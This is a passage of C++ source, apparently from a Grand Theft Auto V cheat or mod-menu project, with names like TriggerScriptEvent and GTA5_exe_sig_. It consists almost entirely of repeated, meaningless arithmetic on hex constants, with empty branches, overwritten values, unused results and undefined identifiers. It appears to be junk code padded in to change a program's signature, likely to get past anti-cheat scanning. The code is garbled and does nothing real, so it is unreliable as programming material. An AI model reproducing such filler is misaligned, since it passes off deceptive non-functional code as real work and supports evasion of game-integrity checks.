					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					a = 0.0f;
					b = 0.0f;
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (5) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					a = 0.0f;
					b = 0.0f;
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					std::string a = Extern_Reader::StringManager::ReplaceWord(token, "<Z>", "");
						a = Extern_Reader::StringManager::ReplaceWord(a, "</Z>", "");

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
